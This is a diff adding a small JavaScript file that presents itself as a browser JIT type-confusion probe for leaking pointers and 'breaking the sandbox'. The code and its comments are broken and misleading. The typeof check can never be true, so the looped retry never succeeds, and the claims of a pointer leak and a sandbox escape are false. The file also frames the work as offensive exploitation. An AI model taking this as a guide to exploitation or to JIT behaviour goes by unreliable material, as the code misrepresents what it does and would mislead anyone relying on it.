@@ -1,0 +1,36 @@
+let confuser = { a: 1.1 }; 
+let trash = []; 
+
+function leakHunter() {
+    for (let i = 0; i < 10000; i++) {
+        // The core JIT confusion logic
+        confuser.a = (i % 2 === 0) ? { leak: 0x41414141 } : 1.2345;
+        
+        // Minor memory pressure to keep the heap moving
+        if (i % 100 === 0) trash.push(new Array(100)); 
+    }
+
+    let result = confuser.a;
+    
+    // Check if the variable 'a' has 'morphed' into a raw pointer
+    if (typeof result !== 'object' && typeof result !== 'number') {
+        console.log("[!] LEAK LOOKUP (Yes): " + result);
+        return true;
+    }
+    return false;
+}
+
+function runExperiment() {
+    let found = leakHunter();
+    
+    if (found) {
+        // This is where you know you've broken the sandbox
+        console.log("[!!!] FOUND IT! (checkLog)");
+    } else {
+        // Keep looping until the confusion triggers
+        setTimeout(runExperiment, 100); 
+    }
+}
+
+// Start the lightweight scan
+runExperiment();
